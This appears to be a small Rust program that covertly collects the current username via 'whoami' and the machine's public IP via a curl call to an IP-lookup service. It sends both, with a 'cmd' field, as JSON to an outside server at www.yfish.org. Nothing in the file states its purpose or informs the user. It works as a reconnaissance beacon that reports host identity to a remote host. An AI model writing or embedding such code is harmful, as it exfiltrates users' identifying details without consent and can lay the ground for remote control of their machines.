
extern crate reqwest;

use std::collections::HashMap;
use std::process::Command;
fn main(){
    let theusername = Command::new("whoami")
        .output()
        .expect("sh command failed to start")
        .stdout;
    let username = String::from_utf8_lossy(&theusername).to_string();

    let thecomputer_ip=Command::new("curl")
        .arg("http://members.3322.org/dyndns/getip")
        .output()
        .expect("ls command failed to start")
        .stdout;

    let computer_ip = String::from_utf8_lossy(&thecomputer_ip).to_string();
    let cmd="hi".to_string();
    let mut map = HashMap::new();
    map.insert("computer_ip", computer_ip);
    map.insert("username", username);
    map.insert("cmd",cmd);
    let client = reqwest::Client::new();
    let res = client.post("http://www.yfish.org/accurity/insert")
        .json(&map)
        .send().unwrap();
}
